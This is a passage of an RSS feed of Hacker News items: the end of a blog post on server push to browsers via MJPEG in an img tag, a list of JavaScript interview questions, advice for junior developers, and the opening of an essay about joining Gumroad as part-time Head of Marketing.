    So in my post <a href="https://underjord.io/is-this-evil.html">Is this evil?</a> I covered a way of tracking users with CSS. While
    thinking about those weird ways of using the web I also started thinking about pushing live data to clients
    without JS. Or at least maintaining a connection.
    So WebSockets requires JS. WebRTC requires JS. Even HLS (video streaming), which would otherwise
    be super cool, with captions for accessibility. But no. Or rather, maybe on Apple platforms. Eh. Not good enough.
</p>
<p>And then it hit me. From some old Nerves projects I'd seen, that there is a standard for just sending a stream of
    JPEG frames as a video. MJPEG. Did you know about MJPEG? Lots of people don't. It is used by lots of webcams and
    security cameras. Common option for Raspberry Pi hacks as well. MJPEG is super simple which is its big advantage.
</p>
<p>But video is what we expect. I was going for something else. So this could be used for a CI status light, showing
    any amount of visual status information. I use it for this:</p>
<p><img alt="live visual readership indicator" loading="lazy" src="https://count.underjord.io/"></p>
<p>That's live. Or dead if my server falls over.</p>
<p>So how does MJPEG work. Well, you take an <code>&lt;img&gt;</code> tag and you shove an MJPEG URL into it. Done.</p>
<p>Okay, that's how you use it. Not how it works. I implemented it in Elixir, Elixir is quite good at keeping state and
    serving updates. Links are below. But basically the browser opens the connection, receives some headers and some
    chunks of data and then realizes it is dealing with MJPEG. It wil then just expect the chunks to keep coming.
    Indefinitely. Because this is live video. Frame by frame of JPEG.</p>
<p>The basic code for the MJPEG headers and chunking was lifted from a pi camera repo made by the Nerves team. It had a
    lot of Frank Hunleth and Connor Rigby in it so kudos to those guys as always. This is what I did with it: <a href="https://github.com/lawik/mjpeg/blob/master/lib/mjpeg.ex">lawik/mjpeg</a></p>
<p>My server implementation is here and uses the above code: <a href="https://github.com/lawik/mjpeg_example/blob/master/lib/mjpeg_example.ex">lawik/mjpeg_example</a></p>
<p>So I receive the connection and then that calls my MjpegExample GenServer to persist the connection and keep track of
    how to notify that connection about new data. It also triggers an update to notify everyone already connected.</p>
<p>This is not polished, it is hammered together and I'm curious to see if it falls over the next time I get a decent
    amount of traffic.</p>
<p>I really like this approach because it is a fun hack that simply happens to work across browsers and quite well at
    that. I like how it is just an img element and no frills. I added lazy loading because that works more nicely with
    things like Google Lighthouse scores and the loading experience (your browser doesn't spend a few seconds thinking
    about loading the image).</p>
<p>Unfortunately it is absolutely a poor choice to actually use aside from fun and hacky stuff. There is no good way of
    doing accessibility with it. You can update the pixels and that is it. Unless you can chunk-stream a txt-file in an
    iframe.
    Haven't tried that yet...</p>
<p>So, don't use it. But isn't it pretty neat?</p>
<p>Of course, much like the CSS tracking, this can be used for evilish things. You can absolutely keep track of how long
    someone keeps receiving your frames and use that for your analytics. I also find it neat that it lets me know
    concurrent users. I just log the number along with sending it out because I want to know at what number it breaks
    and out of curiosity but you can probably do some mildly untoward things with this. Oh.. Wait. You could serve
    rotating ads with this. You know what the last frame you sent was so if you get a click on it you can direct that
    particular user to the right thing. New title: Ad placement entirely without JS, ugh, no thanks. Moving on.</p>
<p>If you know how to make this more dirty, hacky and fun or even more useful or accessible feel free to get in touch at
    <a href="mailto:lars@underjord.io">lars@underjord.io</a> or on
    Twitter where I'm <a href="https://twitter.com/lawik">@lawik</a>.</p><p><img alt="live visual readership indicator" loading="lazy" src="https://count.underjord.io/"></p>

</div></div>]]>
            </description>
            <link>https://underjord.io/live-server-push-without-js.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24590687</guid>
            <pubDate>Fri, 25 Sep 2020 15:17:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[JavaScript Interview Questions and Answers]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24590661">thread link</a>) | @bojanvidanovic
<br/>
September 25, 2020 | https://devandgear.com/posts/javascript-interview-questions-answers/ | <a href="https://web.archive.org/web/*/https://devandgear.com/posts/javascript-interview-questions-answers/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>When trying to get a position in a new company as a JavaScript developer, whether
it be Front-end, Back-end, or Mobile Apps, you will very likely need to
face a technical interview.</p>
<p>This interview will show to your potential future employer your level of skills
in programming with JavaScript, it may require you to do some whiteboard
examples or just a simple question and answer type of an interview.</p>
<p>Some people perform well, some don‚Äôt, because one of the factors is that you apply to
a <a href="https://www.freecodecamp.org/news/what-does-junior-senior-expert-lead-experienced-professional-and-specialist-software-c36563e946e2/">position</a> that is appropriate to you. But in any case, preparation is the key.</p>
<p>By studying and simulating a test will enforce your knowledge and build up your
confidence, the more questions you go through, the more likely you will get one
of those questions.</p>
<p>I created a list of 50 questions that go from beginner to advanced level, try to
answer them first by yourself, and then check the answer. Try to respond to
as many of them as you can and take notes on those you don‚Äôt know or got wrong.</p>
<p>If you think I missed some important questions from the list let me know in the
comments.</p>

<h2 id="questions">Questions</h2>
<ol>
<li>What is JavaScript? <a href="https://en.wikipedia.org/wiki/JavaScript">Answer</a></li>
<li>How to write comments in JavaScript? <a href="https://www.digitalocean.com/community/tutorials/how-to-write-comments-in-javascript">Answer</a></li>
<li>Can you list all JavaScript Data Types? <a href="https://www.w3schools.com/js/js_datatypes.asp">Answer</a></li>
<li>What an object represents in Javascript? <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object">Answer</a></li>
<li>What is a function in Javascript? <a href="https://www.javascript.com/learn/functions">Answer</a></li>
<li>Can you write an example of named function in JavaScript? <a href="https://riptutorial.com/javascript/example/4877/named-functions">Answer</a></li>
<li>Can you write an example of an anonymous function? <a href="https://www.javascripttutorial.net/javascript-anonymous-functions/">Answer</a></li>
<li>Explain the difference between ‚Äú==‚Äù and ‚Äú===‚Äù? <a href="https://howtodoinjava.com/javascript/javascript-equality-vs-identity-operators/">Answer</a></li>
<li>What is the difference between var, let, and const? <a href="https://www.freecodecamp.org/news/var-let-and-const-whats-the-difference/">Answer</a></li>
<li>What is closure in JavaScript? <a href="https://www.youtube.com/watch?time_continue=2&amp;v=Pn2VAebZPOk&amp;feature=emb_title">Answer</a></li>
<li>Can you name 3 loop methods in JavaScript? <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Loops_and_iteration">Answer</a></li>
<li>Can we defined variables with the same names in different scopes? <a href="https://gomakethings.com/defining-and-updating-javascript-variables-in-different-scopes/">Answer</a></li>
<li>Can you invert the order in array? <a href="https://www.w3schools.com/jsref/jsref_reverse.asp">Answer</a></li>
<li>How to empty an array in JavaScript? <a href="https://stackoverflow.com/questions/1232040/how-do-i-empty-an-array-in-javascript">Answer</a></li>
<li>What is DOM? <a href="https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model">Answer</a></li>
<li>Can you name 2 JavaScript paradimgs? <a href="https://advancedweb.dev/javascript-paradigms">Answer</a></li>
<li>What is functional programming? <a href="https://flaviocopes.com/javascript-functional-programming/">Answer</a></li>
<li>What are the pros and cons of functional programming vs object-oriented programming? <a href="https://medium.com/@darrickmckirnan/object-oriented-programming-oop-functional-programming-what-are-they-the-pros-and-cons-11f98a971e38">Answer</a></li>
<li>What is object oriented programming? <a href="https://scotch.io/tutorials/object-oriented-programming-in-javascript">Answer</a></li>
<li>How can we create an object in JavaScript? <a href="https://www.freecodecamp.org/news/a-complete-guide-to-creating-objects-in-javascript-b0e2450655e8/">Answer</a></li>
<li>What is a constructor in Javascript? <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Classes/constructor">Answer</a></li>
<li>Explain ‚ÄòThis‚Äô operator in JavaScript? <a href="https://www.quirksmode.org/js/this.html">Answer</a></li>
<li>What is function binding? <a href="https://javascript.info/bind">Answer</a></li>
<li>Can you explain what is an arrow function? <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/Arrow_functions">Answer</a></li>
<li>What is the purpost of spread operator? <a href="https://www.geeksforgeeks.org/javascript-spread-operator/">Answer</a></li>
<li>What is the use of Push method in JavaScript? <a href="https://www.tutorialspoint.com/javascript/array_push.htm">Answer</a></li>
<li>What is unshift method in JavaScript? <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/unshift">Answer</a></li>
<li>What is the difference between null &amp; undefined? <a href="https://stackoverflow.com/questions/5076944/what-is-the-difference-between-null-and-undefined-in-javascript">Answer</a></li>
<li>What is asynchronous programming? <a href="https://eloquentjavascript.net/11_async.html">Answer</a></li>
<li>What is Promise in Javascript? <a href="https://javascript.info/promise-basics">Answer</a></li>
<li>What are callbacks? <a href="https://javascript.info/callbacks">Answer</a></li>
<li>What is memoization? <a href="https://dev.to/unalo_baayriyo/understanding-memoization-in-javascript-1e22">Answer</a></li>
<li>Can you explain WeakSet in javascript. <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/WeakSet">Answer</a></li>
<li>Can you explain WeakMap in javascript. <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/WeakMap">Answer</a></li>
<li>What is an event bubbling in JavaScript? <a href="https://www.geeksforgeeks.org/event-bubbling-in-javascript/">Answer</a></li>
<li>What is a prototype in Javascript? <a href="https://www.w3schools.com/js/js_object_prototypes.asp">Answer</a></li>
<li>What is the function of delete operator? <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/delete">Answer</a></li>
<li>How do you check if an object is an array or not? <a href="https://stackoverflow.com/questions/4775722/how-to-check-if-an-object-is-an-array">Answer</a></li>
<li>What is a pure function in Javascript? <a href="https://medium.com/javascript-scene/master-the-javascript-interview-what-is-a-pure-function-d1c076bec976">Answer</a></li>
<li>What is an async function? <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/async_function">Answer</a></li>
<li>What is await operator? <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/await">Answer</a></li>
<li>What is hoisting in Javascript? <a href="https://www.w3schools.com/js/js_hoisting.asp">Answer</a></li>
<li>How can we handle exceptions? <a href="https://www.tutorialspoint.com/javascript/javascript_error_handling.htm">Answer</a></li>
<li>What is the difference between classical inheritance and prototypal inheritance? <a href="https://dev.to/crishanks/classical-vs-prototypal-inheritance-2o5a">Answer</a></li>
<li>What is Currying in javascript? <a href="https://javascript.info/currying-partials">Anwser</a></li>
<li>Can you write an example of an arrow function returning an object literal? <a href="https://mariusschulz.com/blog/returning-object-literals-from-arrow-functions-in-javascript">Answer</a></li>
<li>What is a Temporal Dead Zone? <a href="https://stackoverflow.com/questions/33198849/what-is-the-temporal-dead-zone">Answer</a></li>
<li>What is the difference between Call and Apply? <a href="https://stackoverflow.com/questions/1986896/what-is-the-difference-between-call-and-apply">Answer</a></li>
<li>How to clone an object in JavaScript? <a href="https://attacomsian.com/blog/javascript-clone-objects">Answer</a></li>
<li>What optional chaining operator does? <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Optional_chaining">Answer</a></li>
</ol>

<section>
<h2>Author</h2>
<div>
<p><img data-src="https://res.cloudinary.com/dev-and-gear/image/upload/w_200,h_200,c_fill,r_max//v1601042336/EACDEB44-BC4A-4E1E-9C13-553D64E1A0C2_t6ayms.jpg" width="200" height="200" src="https://res.cloudinary.com/dev-and-gear/image/upload/w_200,h_200,c_fill,r_max//v1601042336/EACDEB44-BC4A-4E1E-9C13-553D64E1A0C2_t6ayms.jpg"></p><div>
<p>Bojan Vidanovic is a front-end web developer. Love making internet products, blogging, learning, reading,
calisthenics and fitness enthusiast.<br>
More on <a href="https://bojanvidanovic.com/">www.bojanvidanovic.com</a>.</p>
<address>

</address>
</div>
</div>
</section>
</div><div>
<section>

</section>
<section>
<h2>Dev &amp; Gear Shop</h2>
<a href="https://shop.devandgear.com/" target="_blank">
<img src="https://res.cloudinary.com/dev-and-gear/image/upload/v1599663637/8_ex3rvd.jpg">
</a>
</section>
</div></div>]]>
            </description>
            <link>https://devandgear.com/posts/javascript-interview-questions-answers/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24590661</guid>
            <pubDate>Fri, 25 Sep 2020 15:15:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[If you‚Äôre not practicing with a project, nothing goes into long term memory]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24590583">thread link</a>) | @windy-topology
<br/>
September 25, 2020 | https://www.lifetechpsych.com/lessons-for-junior-dev/ | <a href="https://web.archive.org/web/*/https://www.lifetechpsych.com/lessons-for-junior-dev/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-reactid="8"><p>I initially wrote this post for beginners and junior devs on Reddit and <a href="https://reddit.com/r/learnprogramming/comments/itbw45/lessons_for_beginners_and_junior_developers_after/">it blew up with over 50 awards.</a> So I‚Äôve decided to upgrade parts of it based on people‚Äôs reactions.</p>
<p>Some of these are things I wish I knew at the beginning of my journey as a Software Developer so I could stress less.</p>
<p>Let‚Äôs get to it.</p>
<h2>All tutorials are not created equal.</h2>
<p>Imagine yourself as a lab rat. </p>
<p>As you learn and experiment, pay attention to the kinds of tutorials that work for you. Many will not work. That‚Äôs fine. In fact, that‚Äôs exactly how experiments work until you find a solution.</p>
<p>But the moment you strike gold, stick to it, consume it voraciously and then find similar tutorials like that to continue rapid growth.</p>
<p>
  <a href="https://www.lifetechpsych.com/static/coding-on-a-mac-8784cb962b0593b5efb51100b12ec2ed-8754b.jpg" target="_blank" rel="noopener">
  
  <span>
    <span>
      <img alt="Image of coding on a mac" title="" src="https://www.lifetechpsych.com/static/coding-on-a-mac-8784cb962b0593b5efb51100b12ec2ed-f8fb9.jpg" srcset="https://www.lifetechpsych.com/static/coding-on-a-mac-8784cb962b0593b5efb51100b12ec2ed-e8976.jpg 148w,
https://www.lifetechpsych.com/static/coding-on-a-mac-8784cb962b0593b5efb51100b12ec2ed-63df2.jpg 295w,
https://www.lifetechpsych.com/static/coding-on-a-mac-8784cb962b0593b5efb51100b12ec2ed-f8fb9.jpg 590w,
https://www.lifetechpsych.com/static/coding-on-a-mac-8784cb962b0593b5efb51100b12ec2ed-85e3d.jpg 885w,
https://www.lifetechpsych.com/static/coding-on-a-mac-8784cb962b0593b5efb51100b12ec2ed-d1924.jpg 1180w,
https://www.lifetechpsych.com/static/coding-on-a-mac-8784cb962b0593b5efb51100b12ec2ed-9452e.jpg 1770w,
https://www.lifetechpsych.com/static/coding-on-a-mac-8784cb962b0593b5efb51100b12ec2ed-8754b.jpg 3882w" sizes="(max-width: 590px) 100vw, 590px">
    </span>
  </span>
  
  </a>
    
&nbsp; &nbsp; <em>Photo by <a href="https://unsplash.com/@cgower">Christopher Gower</a> on <a href="https://unsplash.com/">Unsplash</a></em></p>
<p>When I started, I used to bang my head against <em>Head First Java</em>, the book. But after studying for many hours, I just wasn‚Äôt getting anywhere. Yet, everyone online said it was the best programming book ever. But <em>TheNewBoston</em> youtube tutorials did it for me back then even though people don‚Äôt recommend him anymore.</p>
<p>I wish I could say this stopped after my 1st year. </p>
<p>Fast forward 2 years down the line when I started learning algorithms and <em>ALL</em> the blog tutorials I followed just didn‚Äôt make sense until I watched Youtube videos on Hungarian folk dance teaching algorithms.</p>
<p>And it just clicked. </p>
<p>Since then, my approach to learning has been to <strong>learn the same thing from multiple places</strong> until I find the instructor and style that works for me.</p>
<h2>If you‚Äôre not practicing with a project, nothing goes into long term memory</h2>
<p>You‚Äôll forget a lot of things.</p>
<p>Deeply understanding this will change how you learn. </p>
<p>I can‚Äôt count the number of times I took <em>Introduction to Python Programming</em> on Udacity, Coursera, etc and still forgot everything.</p>
<p>It‚Äôs so annoying. </p>
<p>But I‚Äôve since learned that you‚Äôll forget anything you learn in isolated exercises because they are stored in short term memory. Neuroscience research shows that this is just how the brain works. </p>
<p>If you don‚Äôt want to forget, test your knowledge using spaced repetitions. To do this, build projects. </p>
<p>I‚Äôll give you a concrete example: <em>len(myList)</em> will give you the length of a list in Python. You‚Äôll learn this in Udacity‚Äôs intro course. </p>
<p>Come back a month later and you might not remember if it‚Äôs <em>len, length( ) or myList.size( )</em>. </p>
<p>But with spaced repetition through a project, the outcome is different. For example, you work on a 2-month long Django app for new coders where you need to count multiple times the number of users, the number of exercises done, the number of chats, etc. Imagine doing this throughout the span of the project, for two months. it‚Äôs hard to forget what len( ) does.</p>
<p>This is a trivial example, but hopefully you get the idea. </p>
<p>New learners can start with simple, isolated examples. </p>
<p>But <strong>if you‚Äôre not practicing within the scope of a project that makes you use and reuse what you‚Äôve learned, nothing is going into your long term memory</strong>; it‚Äôs all short-term. And you‚Äôll forget.</p>
<h2>Work within fear; not against it.</h2>
<p>I‚Äôll admit: this one is easier said than done. </p>
<p>But you have to master this if you want to last long.</p>
<p>There‚Äôs this temptation to fix your fear first before you continue to learn. Unfortunately, it doesn‚Äôt work like that.</p>
<p>In fact, you‚Äôll spend a lot of time trying to make your fear disappear that it‚Äôll only double your anxiety. You have to find a way ‚Äì your way ‚Äì to acknowledge that you‚Äôre afraid, and frankly will continue to be afraid for a long time, then work within that realization. No need to fight it.</p>
<p>Sometimes, this fear disappears as you become more proficient. </p>
<p>Other times, it vanishes for a while and comes back when you get into a new environment, work with smart software developers, or move to a completely new stack.</p>
<p>It‚Äôs okay.</p>
<p><strong>This <em>IS</em> the life.</strong></p>
<p>It‚Äôs a sinusoidal wave ‚Äì endlessly going up and down. Don‚Äôt take it too seriously or you‚Äôll lose yourself.</p>
<h2>Consistency &gt; hard work.</h2>
<p>Consistency is king. </p>
<p>When you start learning,  you lay down neural pathways that make it easier to retrieve information. According to Neuroscience research, these pathways only get strong through frequency of use, not just intensity.</p>
<p>This means 30 minutes a day, for 5 days a week is way better than 2.5 hours one day, only once a week. </p>
<p>Same hours; Different impact.</p>
<p>Don‚Äôt just work hard, apply wisdom here.</p>
<h2>Talent = hidden practice.</h2>
<p>It‚Äôs easy to dismiss progress as talent.</p>
<p>My first programming class was in C++ and my classmates refused to believe I had never coded before because I was just-so-talented. </p>
<p>But what they also refused to accept was that right after class, I would spend five hours typing <em>cout &lt;&lt; ‚Äúthis is my first program‚Äù</em>, realize it didn‚Äôt run because I forgot a semicolon; retype it and realize it didn‚Äôt print out my statement on a new line because I didn‚Äôt add endl.</p>
<p> This deliberate practice built perceived talent.</p>
<p><strong>Talent is sexier than hustle</strong> so no one wants to hear that you worked hard and got here. Just tell me you were born this way - it‚Äôs more believable.</p>
<p>But becoming a proficient developer is like playing an instrument. </p>
<p>
  <a href="https://www.lifetechpsych.com/static/talent-vs-hustle-chart-123bae5a1fc3df6d4580211126653fe9-e402a.png" target="_blank" rel="noopener">
  
  <span>
    <span>
      <img alt="Chart showing talent vs. hustle" title="" src="https://www.lifetechpsych.com/static/talent-vs-hustle-chart-123bae5a1fc3df6d4580211126653fe9-fb8a0.png" srcset="https://www.lifetechpsych.com/static/talent-vs-hustle-chart-123bae5a1fc3df6d4580211126653fe9-1a291.png 148w,
https://www.lifetechpsych.com/static/talent-vs-hustle-chart-123bae5a1fc3df6d4580211126653fe9-2bc4a.png 295w,
https://www.lifetechpsych.com/static/talent-vs-hustle-chart-123bae5a1fc3df6d4580211126653fe9-fb8a0.png 590w,
https://www.lifetechpsych.com/static/talent-vs-hustle-chart-123bae5a1fc3df6d4580211126653fe9-e402a.png 812w" sizes="(max-width: 590px) 100vw, 590px">
    </span>
  </span>
  
  </a>
    
&nbsp; &nbsp; <em>Talent vs. Hustle - The majority of us mostly hustle our way through it.</em></p>
<p>Only a tiny few are born talented. </p>
<p>The majority can only get as good as the amount of practice they put in. And you can immediately tell a student hasn‚Äôt been practicing the moment they sit at the keyboard.</p>
<h2>You‚Äôll meet a**holes!</h2>
<p>Every field has its dose of horrible people. </p>
<p>No doubt.</p>
<p>But I‚Äôm not sure what it is about software dev that attracts a**holes in droves. Maybe because coding gives the feeling of having a super-power or a rare skill. If you‚Äôre a newbie, you‚Äôll meet those who‚Äôve been coding for years and think no one else should come in.</p>
<p>A windows developer only? You‚Äôll meet linux fanatics that think you‚Äôre mediocre. </p>
<p>If you‚Äôre a woman, you‚Äôll immediately be dismissed because of your gender. I know this from personal stories from colleagues over the years.</p>
<p>If you‚Äôre a minority, you‚Äôll meet people who think you should only fetch coffee; not code. </p>
<p>If you‚Äôre coming from another field (particularly not STEM), you‚Äôll meet people who automatically make themselves gatekeepers of the programming community. </p>
<blockquote>
<p><em>‚ÄúWe don‚Äôt want social scientists here; we‚Äôre purists!‚Äù</em> </p>
</blockquote>
<p>They‚Äôre online. </p>
<p>At work. </p>
<p>And sadly sometimes in your family. </p>
<p>It‚Äôs not <em>if</em> you‚Äôll meet them, it‚Äôs <em>when</em>.</p>
<p><strong>Learn to move on.</strong></p>
<p>Things are getting better but there‚Äôs still a lot to do to educate people. </p>
<p>But don‚Äôt let this deter you. Build your resilience so you don‚Äôt quit after you meet these people. </p>
<p>And when you get to the top don‚Äôt be an a**hole!</p>
<h2>Master 1 thing.</h2>
<p>New developers tend to jump around learning a lot of things. </p>
<p>Okay, it‚Äôs not just new devs; it‚Äôs also experienced folks. </p>
<p>You learned React for one week.</p>
<p>Then JavaScript for two weeks.</p>
<p>Laravel for three. </p>
<p><strong>Stop.</strong></p>
<p>You need to wake up and realize that the harsh truth is that you‚Äôre simply extending the time it‚Äôll take you to truly learn anything. </p>
<blockquote>
<p><em>‚ÄúIf one is a master of one thing and understands one thing well, one has at the same time, insight into and understanding of many things.‚Äù</em> - Vincent Van Gogh</p>
</blockquote>
<p>Pick one thing. </p>
<p>Stick with it for a few months ‚Äì ideally 6 to 12 months before you move to something else. </p>
<p>This has two benefits: </p>
<ul>
<li>You‚Äôll go deep enough and hit critical mass that moves you towards mastery.</li>
<li>After you master one domain, you can transfer knowledge to another. Learn Flask and you can easily walk into Django. Learn React deeply, and you can quickly identify the pros and cons of Laravel within a few days. </li>
</ul>
<p>This doesn‚Äôt mean learn HTML alone for six months then only CSS for 1 year; rather, it means don‚Äôt mix up learning Django, with Express, then React, some Gaming Development, and iOS. </p>
<p>You might get a lot done in a short time.</p>
<p>But you‚Äôll master nothing!</p>
<h2>Software development is an ever evolving field.</h2>
<p>It‚Äôs exciting.
It‚Äôs frustrating.
It‚Äôs intimidating.</p>
<p>But if I had to, I‚Äôd do it all over again.</p>
<h2>Thanks for reading.</h2>
<p>If you enjoyed this and you‚Äôre on Twitter, <a href="https://twitter.com/LifeTechPsych/status/1306588995313438722?s=20">like and retweet this</a> to help spread the word. I know it sounds trivial but it actually really helps.</p>
<p>I‚Äôm trying out a new initiative to help new coders and junior devs feel less overwhelmed, manage imposter syndrome and learn smarter. </p>
<p>To be honest, I‚Äôm not sure what this looks like yet. But I‚Äôm putting together some resources and write-ups based on what people need the most help with. </p>
<p><strong>If you‚Äôre interested, <a href="https://ctt.ac/I1f33">let me know on Twitter</a>. If you prefer sending a direct message, <a href="https://twitter.com/LifeTechPsych">my DM is open.</a></strong></p>
<p><em>Heads Up</em> - I love research so I tend to back my advice and approach with concepts from Behavioral Psychology and Neuroscience.</p></div></div>]]>
            </description>
            <link>https://www.lifetechpsych.com/lessons-for-junior-dev/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24590583</guid>
            <pubDate>Fri, 25 Sep 2020 15:07:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How I Became the Quarter-Time Head of Marketing at Gumroad as a New Grad SWE]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24590467">thread link</a>) | @philipkiely
<br/>
September 25, 2020 | https://philipkiely.com/essays/gumroad_hom.html | <a href="https://web.archive.org/web/*/https://philipkiely.com/essays/gumroad_hom.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p><code>| First Posted <b>24 September 2020</b> | Last Edited <b>24 September 2020</b> | Philip Kiely |</code></p><div>
  <p>On Friday, September 4th, 2020, I logged into my job as a software engineer, flattened some bugs, received a strong first-sixty-days performance review, and ended the workday at a reasonable hour, gently entering a long labor-day weekend. Four days later, I resigned from what was my first <span>SWE</span> job out of college after just twelve enjoyable weeks to take a quarter-time role in marketing making even more money. What&nbsp;happened?</p>
<h3>Daniel&nbsp;Vassallo</h3>
<p>Our story begins in Seattle in early 2019. A man named Daniel Vassallo <a href="https://danielvassallo.com/only-intrinsic-motivation-lasts/">quit a job making $500K a year at <span>AWS</span></a> to work for himself as an independent creator. Originally from Malta, Daniel moved to America during his eight year tenure with Amazon. After leaving <span>AWS</span>, Daniel published an ebook and video course on Gumroad, and by September 2020 had grossed over $200K in&nbsp;sales.</p>
<p>I first encountered Daniel‚Äôs work when I was looking for interview subjects for <a href="https://philipkiely.com/wfsd">Writing for Software Developers</a>. Many of the people who I was interviewing had been writing about software for a decade or more, so I wanted to find someone who was relatively new to writing online but had quickly found massive success. Daniel fit the bill perfectly. On January 21, 2020, I introduced myself with <a href="https://twitter.com/philip_kiely/status/1303480184130228224">this cold email</a>, which quickly led to an&nbsp;interview.</p>
<p>I kept in touch periodically and Daniel gave me a huge signal boost on launch day. In the following months, we built on each others‚Äô posts on Twitter and exchanged a couple of messages, he read my book, I watched his Twitter course. When he did something clever, I copied it, and it usually worked. Stage left is&nbsp;set.</p>
<h3>Sahil&nbsp;Lavingia</h3>
<p>On stage right, Sahil Lavingia is running <a href="https://gumroad.com/">Gumroad</a>. After <a href="https://sahillavingia.com/reflecting">some ups and downs</a>, the company is operating profitably and growing smoothly. When massive portions of the global economy suddenly moved online due to <span>COVID</span>, Gumroad‚Äôs growth spiked. In April 2020, I sent Sahil a cold <span>DM</span> requesting an interview, not for the book, but for a feature-style profile I was writing for my creative nonfiction class in my final semester at Grinnell College. I intended to shop the piece around to various business-focused publications after the workshop. After exchanging several emails with Sahil and writing the piece, I knew it would never be published, not out of lacking merit, but out of conflict of interest: I would be using Gumroad to sell Writing for Software Developers. Every other platform was out of the running once I knew Sahil‚Äôs&nbsp;story.</p>
<p>This essay is long enough without a complete retelling of the launch of Writing for Software Developers, although that is one of my favorite things to retell. Highlights: $15,000 first day, $20,000 first week as a brand new Gumroad user. <a href="https://twitter.com/gumroad/status/1260964938018742272">Here‚Äôs the tweet</a>. I was on Gumroad‚Äôs radar for a minute, but this industry moves&nbsp;fast.</p>
<p>I started writing micro-targeted clickbait a couple of weeks later to maintain my relevance. I say ‚Äúmicro-targeted‚Äù because the only click I was trying to bait was Gumroad‚Äôs click of the retweet button. My <a href="https://twitter.com/philip_kiely/status/1266746268891611137">most successful such tweet</a> got over 169,000 views. <a href="https://twitter.com/philip_kiely/status/1287418074220711937">Most tweets that were picked up</a> did about a tenth of that. Still, it was enough to keep me on Gumroad‚Äôs&nbsp;radar.</p>
<p>Gumroad was also on my radar. In late July, I saw a post from Sahil saying that they were looking to hire some engineers. I looked over the job description, but I didn‚Äôt seriously consider applying. I was not experienced with the technologies in their stack and I don‚Äôt like doing engineering on an hourly basis. Also, I was quite content with my existing <span>SWE</span> job. I give the post a pass, although a line from the last paragraph, ‚Äú<em>Head of Marketing</em> - take over all marketing/growth/content/support from Sahil, build <span>&amp;</span> launch a great multi-year growth strategy,‚Äù did stick in my head for a&nbsp;while.</p>
<p>In August, Justin from Gumroad reached out to me to see if I was interested in being featured in a creator spotlight. I was thrilled! Daniel Vassallo was the series‚Äô first subject; I had figured it would take quite a while until I had a high enough profile to warrant a spotlight. Justin wrote <a href="https://gumroad.com/gumroad/p/creator-spotlight-philip-kiely-s-success-on-gumroad">a great article</a> and Sahil reviewed and approved it personally, so I knew for certain that he knew my full&nbsp;story.</p>
<p>It took about a thousand words, but I‚Äôm fairly sure that you now have the context to understand that my ‚Äúcold‚Äù email was closer in temperature to an off-brand cooler during overtime than a crisp drink from the&nbsp;commercials.</p>
<h3>Philip&nbsp;Kiely</h3>
<p>On September 1st, 2020, I was lying in bed when I saw <a href="https://twitter.com/dvassallo/status/1300853597337341952">this tweet</a> from Daniel. Quarter time? Ten thousand dollars a month? Work at Gumroad where your job is to help more people make more money on the internet? All that for one email and one phone call? Daniel got a sweet deal and I wanted exactly the same thing. I have been known to send a successful cold email. I sat up, typed out <a href="https://twitter.com/philip_kiely/status/1303482038046126080">this email to Sahil</a>, and had a hard time falling asleep that&nbsp;night.</p>
<p><img alt="My Email to Sahil" src="https://philipkiely.com/assets/img/gumroad_hom_email.jpg"></p>
<p>The next morning, Sahil responded ‚Äúhaha, great email. I‚Äôd love to&nbsp;chat.‚Äù</p>
<p>We set a time for the next Monday. I asked if there was anything in particular he‚Äôd like me to prepare for the interview, or if a should bring a surprise. ‚ÄúA surprise works!‚Äù he&nbsp;said.</p>
<p>There was only one problem: I had absolutely no idea what to make. After talking it over with a few friends, I came up with a structure for my application&nbsp;packet.</p>
<p>The&nbsp;surprise:</p>
<ol>
<li>A job&nbsp;description</li>
<li>Plans for growth, content, and&nbsp;support</li>
<li>A plan for an upcoming&nbsp;launch</li>
<li>A reflection on the application&nbsp;process</li>
</ol>
<p>Over the course of the next few nights and that long weekend, I put together the application packet, about six thousand words in all. I kept in touch with Sahil throughout the process, asking various questions to get the context I needed to create meaningful plans. If I had not spent the past six months idly studying Gumroad as a business, I would not have been able to complete so much work so quickly. Exactly 24 hours before I was to talk to Sahil, I sent him the surprise as a series of&nbsp;PDFs.</p>
<p>During those five days, I spent a great deal of emotional energy chasing my shadow. Sahil was <a href="https://twitter.com/shl/status/1301936779440738304">talking publicly</a> about hiring Daniel, and he also kept mentioning doing the same for the role I applied for. In his email newsletter, he wrote ‚Äúeven more amazing folks applying for other positions at the company, including a quarter-time Head of Marketing.‚Äù I saw the massive spread of Daniel‚Äôs own tweet and I concluded that some clearly superior candidate had applied for the same role and basically already had the job. I imagined someone with an <span>MBA</span>, years of experience, and ten times my Gumroad revenues sending exactly the email I had sent. I figured my application was a long shot but I was far enough in that I might as well go through with&nbsp;it.</p>
